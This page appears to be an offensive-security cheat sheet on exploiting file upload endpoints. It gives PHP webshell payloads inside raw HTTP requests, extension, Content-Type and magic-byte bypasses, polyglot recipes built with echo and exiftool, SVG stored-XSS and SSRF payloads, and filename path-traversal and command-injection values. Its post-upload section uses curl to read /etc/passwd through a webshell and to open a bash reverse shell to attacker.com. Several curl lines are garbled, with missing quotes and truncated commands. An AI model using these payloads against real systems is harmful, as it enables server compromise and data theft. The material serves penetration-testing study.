# File Upload

> tags: web, file-operations, intermediate, advanced

> related: Attack-Surface/Web/File-Operations/XXE, Attack-Surface/Web/File-Operations/Path-Traversal, Attack-Surface/Web/Client-Side/XSS/Stored-XSS, Attack-Surface/Web/SSRF/SSRF

File Upload
File upload vulnerabilities are some of the highest-impact bugs you'll find. The dream is RCE via webshell. The reality is usually something more constrained: stored XSS via SVG, partial path control, or a polyglot that executes in a specific viewer. Know the full spectrum so you can chain whatever you get.
The Attack Surface Map
flowchart TD
    A[File Upload Endpoint] --> B{What does the server validate?}
    B --> C[Extension only] --> D[Extension bypass: double ext, null byte, case]
    B --> E[Content-Type only] --> F[Just change the header]
    B --> G[Magic bytes only] --> H[Prepend valid magic bytes to payload]
    B --> I[Extension + Content-Type + Magic] --> J[Polyglot: valid image + payload]
    D & F & H & J --> K{Where does the file land?}
    K --> L[Webroot, executable path] --> M[RCE via webshell request]
    K --> N[Served to users directly] --> O[Stored XSS via SVG/HTML/XHTML]
    K --> P[Processed by parser] --> Q[XXE via SVG/DOCX, ImageMagick exploits]

Extension Bypass
The server checks the file extension. You bypass it.
# Double extension -- server splits on first dot, not last
shell.php.jpg
shell.php.png
shell.asp;.jpg           <- IIS semicolon truncation
 
# Null byte -- older PHP/C code stops at null
shell.php%00.jpg
shell.php\x00.jpg
 
# Case sensitivity -- server checks .php but passes .PHP to interpreter
shell.PHP
shell.pHp
shell.Php
 
# Less common interpreted extensions
shell.phtml
shell.pht
shell.php3
shell.php4
shell.php5
shell.shtml           <- Apache mod_include SSI
shell.shtm
 
# IIS/ASP
shell.asp
shell.asa
shell.ashx
shell.asmx
shell.aspx
 
# JSP
shell.jsp
shell.jspx
shell.jsw
 
# Overriding .htaccess -- if you can upload .htaccess
AddType application/x-httpd-php .jpg
Content-Type Manipulation
The server reads Content-Type from the request, not the file. Change it in Burp.
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----Boundary
 
------Boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg     <- lie here
 
<?php /*DOC*/ system($_GET[cmd]); ?>
------Boundary--
If the server also checks magic bytes, prepend JPEG magic bytes before the PHP payload:
\xFF\xD8\xFF\xE0<?php /*DOC*/ system($_GET[cmd]); ?>
Magic Bytes Check
The server reads the first few bytes of the file. You satisfy it while keeping your payload.
# Python: create a file with valid JPEG magic bytes + PHP payload
with open('polyglot.php', 'wb') as f:
    f.write(b'\xff\xd8\xff\xe0')    # JPEG magic bytes
    f.write(b'<?php /*DOC*/ system($_GET[cmd]); ?>')
Common magic bytes:



































FormatHexASCIIJPEGFF D8 FFÿØÿPNG89 50 4E 47.PNGGIF47 49 46 38GIF8PDF25 50 44 46%PDFZIP50 4B 03 04PK..
Polyglot Files
A polyglot is a file that's valid in multiple formats simultaneously. GIFAR (GIF+JAR) is the classic. More relevant today:
# GIF + PHP polyglot
echo 'GIF89a<?php /*DOC*/ system($_GET[cmd]); ?>' > polyglot.php
# Valid GIF header, PHP payload follows -- passes GIF magic check
 
# JPEG + PHP via exiftool
exiftool -Comment='<?php /*DOC*/ system($_GET[cmd]); ?>' legitimate.jpg
cp legitimate.jpg shell.php
# PHP payload in EXIF, file passes JPEG magic check
 
# PNG + SVG polyglot (for XSS when content is served)
# Harder but possible for SVG with XML declaration
SVG for Stored XSS
When the app serves uploaded files directly and SVG is allowed:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="www.w3.org/2000/svg" onload="alert(document.domain)">
  <rect width="300" height="100" />
</svg>
Also works for SSRF if the server processes the SVG server-side (ImageMagick, Inkscape, etc.):
<svg xmlns="www.w3.org/2000/svg" xmlns:xlink="www.w3.org/1999/xlink">
  <image xlink:href="your-collaborator.burpcollaborator.net/ssrf" />
</svg>
Filename Injection
The filename itself is an injection vector. Some servers use it in file system operations:
../../../etc/cron.d/backdoor     <- path traversal in filename
; ls -la                          <- command injection if passed to shell
../../.htaccess                   <- overwrite .htaccess
Also: stored XSS via filename if the app reflects it in a listing page without encoding.
<img src=x onerror=alert(1)>.jpg
Post-Upload Exploitation
You got the file to land. Now what?
# Webshell interaction
curl "target.com/uploads/shell.php
curl "target.com/uploads/shell.php+/etc/passwd"
 
# Upgrade to reverse shell via webshell
curl "target.com/uploads/shell.php" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'"
 
# If direct path doesn't work, find the upload location
curl "target.com/uploads/shell.php
curl "target.com/uploads/shell.php / -name shell.php 2>/dev/null"
Checklist

 Find all upload endpoints (profile pics, attachments, imports, document editors)
 Test: upload PHP (or relevant server-side) file - what error do you get?
 Test: extension bypass variants (double ext, null byte, alternate extensions)
 Test: change Content-Type to image/jpeg with PHP body
 Test: prepend magic bytes, keep PHP payload
 If SVG accepted: test for stored XSS and SSRF
 Check where the file lands: is it in webroot? Is it served with its original extension?
 Check filename reflection in file listings for XSS
 Test .htaccess upload to remap extension to PHP

Related

XXE - SVG and DOCX uploads enabling XXE
Path Traversal - filename-based traversal on upload
Stored XSS - SVG/HTML upload to XSS
SSRF - server-side SVG/image processing
